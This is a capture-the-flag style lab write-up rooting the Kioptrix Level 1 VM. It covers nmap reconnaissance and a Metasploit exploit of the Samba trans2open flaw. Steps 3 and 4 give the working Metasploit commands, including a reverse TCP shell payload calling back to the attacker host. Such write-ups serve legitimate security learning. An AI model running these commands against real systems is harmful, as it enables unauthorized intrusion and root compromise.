# Kioptrix Level 1 — Rooted

## Overview

Kioptrix Level 1 is a vulnerable virtual machine built for beginners to practice penetration testing in a legal lab environment.

- **Goal:** Gain root access to the target machine.
- **Result:** Root access achieved.
- **Date:** 23 November 2026

## Lab Setup

- **Attacker:** Kali Linux 2026.3 on VMware
- **Target:** Kioptrix Level 1 on VMware
- **Network:** Both machines on the same NAT network
- **Tools:** Nmap, Metasploit Framework

## Step 1: Finding the Target

I first checked my own Kali IP to understand my network range.

ip a

My Kali IP was 10.186.124.208, which means my network range was 10.186.124.0/24.

Then I scanned the network to find live hosts:

nmap -sn 10.186.124.0/24

- nmap scans the network.
- -sn only checks which hosts are online, without scanning ports.
- 10.186.124.0/24 means scan all addresses from 10.186.124.1 to 10.186.124.255.

Result:
- 10.186.124.179 — Router / other device
- 10.186.124.208 — My Kali Linux
- 10.186.124.199 — Kioptrix (Target)

I identified Kioptrix because its MAC address showed VMware, and it was different from my Kali MAC address.

## Step 2: Scanning the Target

nmap -sV -A 10.186.124.199

- -sV finds the service name and version on each open port.
- -A is an aggressive scan. It finds OS, service version, and runs basic scripts.

Result:
PORT 22 — ssh — OpenSSH 2.9p2
PORT 80 — http — Apache 1.3.20
PORT 139 — netbios-ssn — Samba smbd — TARGET
PORT 443 — https — Apache 1.3.20
OS: Linux 2.4.9 - 2.4.18

Analysis: Port 139 was running Samba, a file-sharing service. The version was old and had a known vulnerability called trans2open. This was the weakest point.

## Step 3: Exploitation with Metasploit

msfconsole
search samba trans2open
use 1
set RHOSTS 10.186.124.199
set LHOST 10.186.124.208
show options
exploit

- RHOSTS is the Remote Host — the machine to hack (Kioptrix).
- LHOST is the Local Host — my machine (Kali).

## Step 4: Problem and Solution

When I ran exploit first time, Metasploit started bruteforcing return addresses for more than 30 minutes.

Why: Metasploit did not know the exact memory address, so it tried all possible addresses one by one. This is called bruteforce and it is very slow.

Solution: I stopped the exploit with Ctrl + C and changed the payload from Meterpreter to a simple shell, which is lighter and works faster on old machines.

set TARGET 0
set payload linux/x86/shell/reverse_tcp
exploit

This time it worked. Multiple sessions opened: Session 5, 6, 7, 8.

## Step 5: Getting Root Access

The exploit was still running, so I stopped it with Ctrl + C.

Metasploit asked: Abort session 5? [y/N]

I pressed N because I did not want to close the session. I only wanted to stop the exploit loop.

Then I entered the latest session:
sessions -i 8

Now I was inside Kioptrix.

## Proof

whoami
> root

id
> uid=0(root) gid=0(root) groups=99(nobody)

hostname
> kioptrix.level1

uid=0 means root user — the owner of the machine.

## What I Learned

1. Recon is everything. Without finding the IP and open ports, you cannot attack.
2. Always check the version. The exploit depends on the service version, not just the port.
3. Choose the right payload. Meterpreter is powerful but heavy. On old machines, a simple shell works faster.
4. Do not panic on bruteforce. If bruteforce takes too long, stop, think, and change the approach.
5. Ctrl + C stops the current process, but sessions remain open. Pressing N saved my session.
6. Documentation matters. Writing every step helps in understanding and remembering the attack.
